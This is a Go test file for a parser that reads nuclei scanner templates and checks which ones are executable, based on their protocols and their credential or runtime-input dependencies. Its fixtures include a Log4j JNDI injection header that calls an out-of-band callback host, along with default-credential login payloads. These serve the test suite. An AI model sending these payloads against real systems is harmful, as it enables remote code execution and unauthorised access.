package pocs

import (
	"os"
	"path/filepath"
	"testing"
)

const sampleTemplate = `id: CVE-2021-44228-log4j-rce

info:
  name: Log4j RCE
  author: pdteam
  severity: critical
  description: Apache Log4j2 远程代码执行
  classification:
    cvss-score: 10.0
    cve-id: CVE-2021-44228
    cwe-id: CWE-502
  tags: cve,cve2021,rce,log4j
  reference:
    - https://example.com

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{BaseURL}}
        X-Api-Version: ${jndi:ldap://{{interactsh-url}}}
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
`

func writeTemp(t *testing.T, name, content string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestParseTemplate(t *testing.T) {
	path := writeTemp(t, "tpl.yaml", sampleTemplate)
	meta, err := ParseTemplateFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if meta.TemplateID != "CVE-2021-44228-log4j-rce" {
		t.Errorf("template id = %q", meta.TemplateID)
	}
	if meta.Severity != "critical" {
		t.Errorf("severity = %q, want critical", meta.Severity)
	}
	if meta.CVSSScore != 10.0 {
		t.Errorf("cvss = %v", meta.CVSSScore)
	}
	if len(meta.CVEIDs) != 1 || meta.CVEIDs[0] != "CVE-2021-44228" {
		t.Errorf("cve ids = %v", meta.CVEIDs)
	}
	if len(meta.Protocols) != 1 || meta.Protocols[0] != "http" {
		t.Errorf("protocols = %v", meta.Protocols)
	}
	if !meta.HasInteractsh {
		t.Error("should detect interactsh marker")
	}
	if meta.Tags[0] != "cve" || len(meta.Tags) != 4 {
		t.Errorf("tags = %v", meta.Tags)
	}
	if meta.ContentHash == "" || meta.FileSize == 0 {
		t.Error("hash/size not populated")
	}
}

func TestParseTemplateFlexScalar(t *testing.T) {
	// 标量形式的 tags/author/severity（社区模板常见写法）
	path := writeTemp(t, "tpl2.yaml", `id: cnvd-2021-95914-test
info:
  name: scalar test
  author: somes author
  severity: high, critical
  tags: cnvd,cnvd-2021-95914
http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers:
      - type: status
        status:
          - 200
`)
	meta, err := ParseTemplateFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if meta.Severity != "critical" {
		t.Errorf("severity = %q, want critical (取最高)", meta.Severity)
	}
	if len(meta.CNVDIDs) == 0 {
		t.Error("should extract CNVD id from tags/filename")
	}
	// 标量无逗号时视为单一作者（含空格不拆分，与 nuclei StringSlice 语义一致）
	if len(meta.Authors) != 1 || meta.Authors[0] != "somes author" {
		t.Errorf("authors = %v", meta.Authors)
	}
}

func TestParseTemplateLegacyRequestsAlias(t *testing.T) {
	// nuclei 旧式别名：顶层 requests 等价于 http，引擎照常加载，
	// 静态协议识别必须归一化，否则被 canExecute 误杀（回归保护）。
	path := writeTemp(t, "legacy.yaml", `id: legacy-requests-alias
info:
  name: legacy requests
  severity: info
requests:
  - method: GET
    path:
      - "{{BaseURL}}/a"
    matchers:
      - type: status
        status:
          - 200
`)
	meta, err := ParseTemplateFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if len(meta.Protocols) != 1 || meta.Protocols[0] != "http" {
		t.Errorf("protocols = %v, want [http]", meta.Protocols)
	}
	if !canExecute(meta) {
		t.Errorf("legacy requests template should be executable, protocols=%v", meta.Protocols)
	}
}

func TestParseTemplateMissingID(t *testing.T) {
	path := writeTemp(t, "notpl.yaml", "info:\n  name: no id here\n")
	if _, err := ParseTemplateFile(path); err == nil {
		t.Error("should error on missing id")
	}
}

func TestParseTemplateCredentials(t *testing.T) {
	// 凭证依赖模板（login-check/creds-stuffing 惯例：variables 段引用运行时输入）
	path := writeTemp(t, "creds.yaml", `id: grafana-login-check-test
info:
  name: Grafana Login Check
  author: test
  severity: critical
  tags: login-check,grafana,creds-stuffing
variables:
  username: "{{username}}"
  password: "{{password}}"
http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}

        {"user":"{{username}}","password":"{{password}}"}
    matchers:
      - type: status
        status:
          - 200
`)
	meta, err := ParseTemplateFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !meta.NeedsCredentials {
		t.Error("should detect credentials dependency")
	}
	if canExecute(meta) {
		t.Error("credentials template should not be executable")
	}
}

func TestCanExecuteInteractsh(t *testing.T) {
	// interactsh 依赖模板：引擎禁用 OOB 回连，恒定失败 → 不可执行
	path := writeTemp(t, "oob.yaml", sampleTemplate) // sampleTemplate 含 {{interactsh-url}}
	meta, err := ParseTemplateFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !meta.HasInteractsh {
		t.Error("should detect interactsh dependency")
	}
	if canExecute(meta) {
		t.Error("interactsh template should not be executable")
	}
}

func TestCanExecutePureCode(t *testing.T) {
	// 纯 code 模板（无 http/network/websocket 顶层协议）：本地子进程发请求，
	// 引擎层无请求/响应事件（流量恒空、判定兜底 MISS），且依赖本机外部工具 → 不可执行
	path := writeTemp(t, "pure-code.yaml", `id: CVE-2024-12356-test
info:
  name: Pure Code Template
  author: test
  severity: critical
code:
  - engine:
      - sh
      - bash
    source: |
      curl -k -s "$Scheme://$Host/get_portal_info"
    matchers:
      - type: word
        words:
          - "0 success"
`)
	meta, err := ParseTemplateFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !isPureCode(meta.Protocols) {
		t.Errorf("protocols %v should be pure code", meta.Protocols)
	}
	if canExecute(meta) {
		t.Error("pure code template should not be executable")
	}
}

func TestCanExecuteMixedCode(t *testing.T) {
	// 混合模板（code + http）：http 段由引擎发请求、可抓流量 → 可执行
	path := writeTemp(t, "mixed-code.yaml", `id: mixed-code-http-test
info:
  name: Mixed Code and HTTP Template
  author: test
  severity: high
http:
  - method: GET
    path:
      - "{{BaseURL}}/health"
    matchers:
      - type: status
        status:
          - 200
code:
  - engine:
      - sh
    source: |
      echo "auxiliary check"
    matchers:
      - type: word
        words:
          - "auxiliary"
`)
	meta, err := ParseTemplateFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if isPureCode(meta.Protocols) {
		t.Errorf("protocols %v should not be pure code", meta.Protocols)
	}
	if !canExecute(meta) {
		t.Error("mixed code+http template should be executable")
	}
}

func TestNeedsCredentialsRawRef(t *testing.T) {
	// raw 请求直接引用 {{username}}/{{password}} 且无提供源：
	// nuclei 无法解析 → 不发出请求、事件为空（无流量）→ 不可执行
	path := writeTemp(t, "creds-raw-ref.yaml", `id: creds-raw-ref-test
info:
  name: Creds Raw Ref
  author: test
  severity: high
http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}

        log={{username}}&pwd={{password}}
    matchers:
      - type: status
        status:
          - 200
`)
	meta, err := ParseTemplateFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !meta.NeedsCredentials {
		t.Error("raw {{username}} reference without provider should be detected as credentials dependency")
	}
	if canExecute(meta) {
		t.Error("creds raw-ref template should not be executable")
	}
}

func TestNeedsCredentialsPayloadsProvided(t *testing.T) {
	// default-login 模板：payloads 提供静态凭证（pitchfork 攻击模式）→ 可正常执行
	path := writeTemp(t, "creds-payloads.yaml", `id: creds-payloads-test
info:
  name: Creds Payloads Provided
  author: test
  severity: high
http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}

        user={{username}}&pass={{password}}
    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin123
    matchers:
      - type: status
        status:
          - 200
`)
	meta, err := ParseTemplateFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if meta.NeedsCredentials {
		t.Error("payloads-provided credentials should be executable")
	}
	if !canExecute(meta) {
		t.Error("payloads-provided template should be executable")
	}
}

func TestNeedsRuntimeInputVars(t *testing.T) {
	// variables 块自引用（database: "{{database}}"，需 -vars 传入）：
	// 无输入时请求无法生成、事件为空 → 不可执行
	path := writeTemp(t, "vars-selfref.yaml", `id: vars-selfref-test
info:
  name: Vars Self Reference
  author: test
  severity: high
variables:
  database: "{{database}}"
http:
  - raw:
      - |
        GET /{{database}}/info HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: status
        status:
          - 200
`)
	meta, err := ParseTemplateFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !meta.NeedsCredentials {
		t.Error("variables self-reference should be detected as runtime input dependency")
	}
	if canExecute(meta) {
		t.Error("runtime-input template should not be executable")
	}
}

func TestNeedsRuntimeInputVarsStaticOK(t *testing.T) {
	// variables 块静态值 + 变量互引 + 内置变量引用：均为合法，可执行
	path := writeTemp(t, "vars-static.yaml", `id: vars-static-test
info:
  name: Vars Static OK
  author: test
  severity: high
variables:
  base: "/api"
  full: "{{base}}/v1"
  host_ref: "{{Hostname}}"
http:
  - raw:
      - |
        GET {{full}} HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: status
        status:
          - 200
`)
	meta, err := ParseTemplateFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if meta.NeedsCredentials {
		t.Error("static variables with cross-references should be executable")
	}
	if !canExecute(meta) {
		t.Error("static variables template should be executable")
	}
}

func TestNeedsRuntimeEnvInputCode(t *testing.T) {
	// 混合 code+http 模板：code 源码引用 nuclei 未提供的 ENV（SAMLResponse、
	// username 等需 -vars 传入）——无输入时脚本崩溃、模板链中止
	// （无事件、无流量）→ 不可执行（CVE-2024-9487 模式）。
	path := writeTemp(t, "code-env-dep.yaml", `id: code-env-dep-test
info:
  name: Code ENV Dependency
  author: test
  severity: critical
code:
  - engine:
      - ruby
    source: |
      saml = Base64.decode64(CGI.unescape(ENV['SAMLResponse']))
      url = "#{ENV['RootURL']}/saml/metadata"
http:
  - raw:
      - |
        POST /saml/consume HTTP/1.1
        Host: {{Hostname}}

        SAMLResponse={{code_response}}
    matchers:
      - type: status
        status:
          - 302
`)
	meta, err := ParseTemplateFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !meta.NeedsCredentials {
		t.Error("code source referencing undefined ENV should be detected as runtime input dependency")
	}
	if canExecute(meta) {
		t.Error("ENV-dependent code template should not be executable")
	}
}

func TestNeedsRuntimeEnvInputProvidedOK(t *testing.T) {
	// 混合 code+http 模板：code 源码仅引用 nuclei 提供的目标派生 ENV
	// （RootURL/BaseURL/Hostname 等）→ 可执行（CVE-2026-10795 模式）。
	path := writeTemp(t, "code-env-ok.yaml", `id: code-env-ok-test
info:
  name: Code ENV Provided OK
  author: test
  severity: high
code:
  - engine:
      - ruby
    source: |
      url = "#{ENV['RootURL']}/api"
      puts "check #{ENV['Hostname']}"
http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}

        data={{code_response}}
    matchers:
      - type: status
        status:
          - 200
`)
	meta, err := ParseTemplateFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if meta.NeedsCredentials {
		t.Error("code source referencing only provided ENV should be executable")
	}
	if !canExecute(meta) {
		t.Error("provided-ENV code template should be executable")
	}
}

func TestNeedsRuntimeEnvInputVarsDefined(t *testing.T) {
	// code 源码引用的 ENV 在模板 variables 块中有定义 → 可执行。
	path := writeTemp(t, "code-env-vars.yaml", `id: code-env-vars-test
info:
  name: Code ENV Vars Defined
  author: test
  severity: high
variables:
  token: "static-token-value"
code:
  - engine:
      - python3
    source: |
      import os
      t = os.getenv('token')
      print(t)
http:
  - method: GET
    path:
      - "{{BaseURL}}/check?token={{token}}"
    matchers:
      - type: status
        status:
          - 200
`)
	meta, err := ParseTemplateFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if meta.NeedsCredentials {
		t.Error("ENV name defined in variables block should not be flagged")
	}
	if !canExecute(meta) {
		t.Error("variables-defined ENV code template should be executable")
	}
}

func TestDiscover(t *testing.T) {
	dir := t.TempDir()
	// 有效模板
	if err := os.MkdirAll(filepath.Join(dir, "sub"), 0o755); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(filepath.Join(dir, "a.yaml"), []byte(sampleTemplate), 0o644)
	os.WriteFile(filepath.Join(dir, "sub", "b.yml"), []byte(sampleTemplate), 0o644)
	// 杂项 yaml
	os.WriteFile(filepath.Join(dir, "docker-compose.yml"), []byte("version: '3'\nservices: {}\n"), 0o644)
	// .git 内的模板应被跳过
	os.MkdirAll(filepath.Join(dir, ".git"), 0o755)
	os.WriteFile(filepath.Join(dir, ".git", "c.yaml"), []byte(sampleTemplate), 0o644)

	files, err := Discover(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(files) != 2 {
		t.Fatalf("want 2 discovered, got %d: %v", len(files), files)
	}
}
